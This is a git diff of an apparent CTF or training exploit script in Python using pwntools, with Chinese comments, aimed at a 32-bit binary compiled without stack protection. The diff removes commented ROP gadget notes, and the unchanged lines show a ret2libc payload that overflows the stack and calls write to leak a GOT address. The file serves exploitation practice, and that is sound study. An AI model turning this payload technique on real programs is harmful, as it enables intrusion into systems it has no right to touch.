@@ -1,12 +1,13 @@
 '''
 Author: 白银
 Date: 2022-12-13 21:40:24
-LastEditTime: 2022-12-15 19:45:07
+LastEditTime: 2022-12-16 19:30:39
 LastEditors: 白银
 Description: 源码没直接写system的  gcc question_5.c -m32 -fno-stack-protector -no-pie -o question_5_x86  https://www.bilibili.com/video/BV1mr4y1Y7fW?t=89.4&p=21
 Attention: 在哪编译的，就用哪里的libc文件反编译
 FilePath: /pwn/question_5_x86.py
 '''
+
 from pwn import *
 
 set_arch = 2
@@ -41,9 +42,6 @@ deadbeef = 0xdeadbeef  # func的返回地址，随意
 # bin_sh_addr = 0x804c018  # search "/bin/sh"
 write_sym = 0x8049050  # ida找_write，看jmp到哪，不用进去，就看左边是哪
 leak_func_got = 0x804C008  # ida找_write，看jmp到哪，进去找write
-# ROPgadget --binary question_5_x64 --only "pop|ret"的0x00000000004006a3 : pop rdi ; ret
-# pop_rdi_ret = 0x4006a3
-# pop_rsi_r15_ret = 0x4006a1  # 0x00000000004006a1 : pop rsi ; pop r15 ; ret
 
 payload = flat([b'a' * padding, write_sym, return_addr, 1, leak_func_got, 4])
 
